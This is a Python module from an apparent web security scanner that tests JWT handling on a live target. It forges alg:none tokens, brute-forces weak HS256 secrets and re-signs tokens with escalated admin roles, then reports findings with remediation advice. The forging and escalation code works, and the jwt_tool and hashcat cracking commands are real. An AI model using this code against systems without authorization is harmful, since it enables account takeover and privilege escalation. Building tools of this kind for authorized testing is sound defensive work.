"""A02 — Cryptographic Failures, focused on JWT.

Given a genuine token from bootstrap, this module tries to *forge* one the
server will accept, proving the failure end-to-end against the live target:
  1. ``alg:none`` — strip the signature; if a protected route accepts it, the
     verifier trusts an unsigned token.
  2. Weak HS256 secret — brute-force the signing key from source-scanned
     candidates + a built-in wordlist; a hit means anyone can mint admin tokens.
  3. Escalation — re-sign with a bumped role/scope claim and confirm acceptance.
Also flags tokens passed in query strings (logged/cached credential exposure).
"""

from __future__ import annotations

import hashlib
import hmac
import json
from base64 import urlsafe_b64encode

from ..core.context import Context
from ..core.taxonomy import REFS
from ..discovery import auth as auth_detect
from .base import module

_ROLE_CLAIMS = ("role", "roles", "scope", "scopes", "is_admin", "is_superuser",
                "admin", "permissions", "groups", "account_type")
_ADMIN_VALUES = ("admin", "super_admin", "superuser", "administrator", "API")


def _b64(data: bytes) -> str:
    return urlsafe_b64encode(data).rstrip(b"=").decode()


def _encode(header: dict, claims: dict, secret: str | None) -> str:
    h = _b64(json.dumps(header, separators=(",", ":")).encode())
    p = _b64(json.dumps(claims, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if header.get("alg") == "none" or secret is None:
        return f"{h}.{p}."
    sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64(sig)}"


def _accepts(ctx: Context, token: str) -> tuple[bool, int]:
    """Does a protected route accept this token? Prefer the 'me' endpoint."""
    path = ctx.auth.me_path
    if not path:
        # fall back to any secured no-path-param GET
        cand = [r for r in ctx.routes.secured() if r.method == "GET" and not r.has_path_param]
        if not cand:
            return False, 0
        path = cand[0].path
    r = ctx.get(path, token=token)
    return r.status_code < 300, r.status_code


@module("a02", "Cryptographic Failures / JWT forging")
def run(ctx: Context) -> None:
    principal = ctx.profile.any_authed()
    if not principal or not principal.token:
        ctx.note("no authenticated token available; JWT checks skipped")
        return
    token = principal.token
    decoded = auth_detect.decode_jwt(token)
    if decoded is None:
        ctx.finding(
            id="a02-not-jwt", owasp="A02", severity="INFO",
            title="Session token is not a JWT",
            summary="The bearer token is opaque (not a decodable JWT); JWT-forging checks "
                    "do not apply. Confirm it is a high-entropy, server-side session handle.",
        )
        return
    header, claims = decoded
    alg = header.get("alg", "?")
    ctx.note(f"JWT alg={alg}, claims={sorted(claims)}")

    _alg_none(ctx, header, claims)
    _weak_secret(ctx, header, claims)
    _token_in_query(ctx)


def _escalate(claims: dict) -> dict:
    c = dict(claims)
    for k in _ROLE_CLAIMS:
        if k in c:
            if isinstance(c[k], list):
                c[k] = list(dict.fromkeys([*c[k], "admin", "super_admin"]))
            elif isinstance(c[k], bool):
                c[k] = True
            else:
                c[k] = "super_admin"
    return c


def _alg_none(ctx: Context, header: dict, claims: dict) -> None:
    for variant in ("none", "None", "NONE"):
        h = {**header, "alg": variant}
        forged = _encode(h, _escalate(claims), None)
        ok, code = _accepts(ctx, forged)
        if ok:
            ctx.finding(
                id="a02-alg-none", owasp="A02", severity="CRITICAL",
                title="JWT 'alg:none' accepted — signature verification bypassed",
                summary=(
                    "The server accepted a token with the signature algorithm set to "
                    f"'{variant}' and no signature. Any party can mint a token with "
                    "arbitrary claims (including elevated role/scope) and be trusted."
                ),
                evidence=f"forged alg:{variant} token accepted at {ctx.auth.me_path} "
                         f"(HTTP {code})\n{forged}",
                reproduction="Take a valid JWT, set header alg to 'none', drop the "
                             "signature, escalate a role claim, and replay it.",
                references=[REFS["ps-jwt"], REFS["A02"]],
                tools=["jwt_tool", "Burp (JWT Editor)", "pyjwt"],
            )
            return
    ctx.finding(
        id="a02-alg-none", owasp="A02", severity="SAFE",
        title="JWT 'alg:none' is rejected",
        summary="Unsigned (alg:none) tokens were refused by the protected endpoint.",
    )


def _weak_secret(ctx: Context, header: dict, claims: dict) -> None:
    if not str(header.get("alg", "")).upper().startswith("HS"):
        ctx.note(f"token alg {header.get('alg')} is not HMAC; weak-secret brute-force skipped")
        return
    from ..discovery.source import jwt_secret_candidates
    candidates = jwt_secret_candidates(ctx.profile.secrets)
    for secret in candidates:
        # re-sign the ORIGINAL claims first: acceptance proves the secret is right.
        probe = _encode({**header, "alg": "HS256"}, claims, secret)
        ok, code = _accepts(ctx, probe)
        if not ok:
            continue
        # secret confirmed — now prove privilege escalation.
        forged = _encode({**header, "alg": "HS256"}, _escalate(claims), secret)
        esc_ok, esc_code = _accepts(ctx, forged)
        src = next((s.source for s in ctx.profile.secrets if s.value == secret), "built-in wordlist")
        ctx.finding(
            id="a02-weak-hs256-secret", owasp="A02", severity="CRITICAL",
            title="JWT HS256 signing secret is guessable — full token forgery",
            summary=(
                f"The HMAC signing key was recovered ({'from ' + src}). With the key, an "
                "attacker forges tokens for any user and role. A re-signed escalated token "
                f"was {'accepted' if esc_ok else 'minted'} against the target."
            ),
            evidence=f"secret = {secret!r}  (source: {src})\n"
                     f"re-signed original claims accepted (HTTP {code})\n"
                     f"escalated token -> HTTP {esc_code}",
            reproduction=f"jwt_tool <token> -C -d <wordlist>   # cracks to {secret!r}\n"
                         "then sign a super_admin token with it.",
            references=[REFS["ps-jwt"], REFS["A02"]],
            tools=["jwt_tool", "hashcat -m 16500", "pyjwt"],
        )
        return
    ctx.finding(
        id="a02-weak-hs256-secret", owasp="A02", severity="SAFE",
        title="JWT HS256 secret resisted the tested wordlist",
        summary=f"None of {len(candidates)} candidate secrets (source-scanned + built-in "
                "wordlist) produced a token the server accepted. Not a proof of strength — "
                "run a full hashcat/jwt_tool crack for assurance.",
    )


def _token_in_query(ctx: Context) -> None:
    hits = []
    for r in ctx.routes:
        for p in r.query_params:
            name = str(p.get("name", "")).lower()
            if name in ("token", "access_token", "jwt", "api_key", "apikey", "auth"):
                hits.append((r, p.get("name")))
    if hits:
        sample = "\n".join(f"  {r.method} {r.path} ?{name}=" for r, name in hits[:12])
        ctx.finding(
            id="a02-token-in-query", owasp="A02", severity="LOW",
            title=f"{len(hits)} route(s) accept a credential in the query string",
            summary=(
                "Tokens passed as query parameters leak into access logs, browser history, "
                "proxy caches and Referer headers. Move them to the Authorization header or "
                "a short-lived single-use ticket."
            ),
            evidence=sample,
            references=[REFS["A02"]],
            tools=["Burp", "grep access.log"],
        )
